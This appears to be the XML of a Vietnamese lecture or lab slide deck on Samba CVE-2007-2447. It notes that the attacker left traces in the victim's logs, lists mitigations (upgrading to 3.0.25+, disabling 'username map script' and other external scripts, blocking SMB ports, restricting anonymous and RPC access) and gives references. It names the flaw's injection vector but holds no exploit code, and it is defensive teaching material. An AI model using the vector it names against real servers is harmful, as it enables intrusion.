          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3536766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7CE89A6-F11C-4122-BBCE-4A8816CB2BB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3962399" y="2084833"/>
            <a:ext cx="7197726" cy="2318918"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Vì</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</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bất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kỳ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>biện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>che</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dấu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nào</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>khi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> log </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> victim ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dễ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>được</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="204050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304798" y="150098"/>
            <a:ext cx="11670183" cy="720411"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Giải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>giảm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiểu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B94DD568-432F-4E97-A7C5-EAC60A2945D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="304800" y="2374873"/>
            <a:ext cx="955421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Nâng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cấp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Samba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phiên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3.0.25 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>hoặc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cao</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hơn</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="18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lỗ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hổng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này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phiên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này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trở</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Tenable®+1</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Nếu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nâng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cấp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ngay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xóa</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hoặc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vô</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hiệu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hóa</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mọi</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> shell script </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>bên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ngoài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err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>smb.conf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> — </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>ví</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="6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username map script</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>lệnh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>thêm</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> in, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>lệnh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>quản</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>lý</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="600" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> file share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3"/>
              </a:rPr>
              <a:t>Samba+2CERT Coordination Center+2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Giới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quyền</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truy</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cập</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mạng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tới</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> server Samba</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="18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chỉ</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phép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IP/trusted host </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>kết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chặn</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> port 137, 139, 445 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>nếu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cần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thiết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giảm</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> surface </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>tấn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Medium+1</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Đảm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cấu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mật</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Samba </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>theo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khuyến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chế</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> anonymous, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>hạn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chế</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 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cần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soát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chặt</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> RPC.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1246086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7C86-EBF7-47C1-84C3-305EECD76237}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="363535" y="128152"/>
            <a:ext cx="11333469" cy="581422"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>Tham</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>chiếu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>Tài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>liệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A7D0FF9-EF88-42F4-A984-252FD9CE35F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="363535" y="1045046"/>
            <a:ext cx="87799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Trang </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>chính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thức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Samba </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>về</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> CVE-2007-2447 — </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tả</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> chi </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>tiết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hổng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2"/>
              </a:rPr>
              <a:t>Samba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Báo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NVD / database </a:t>
            </a:r>
            <a:r>
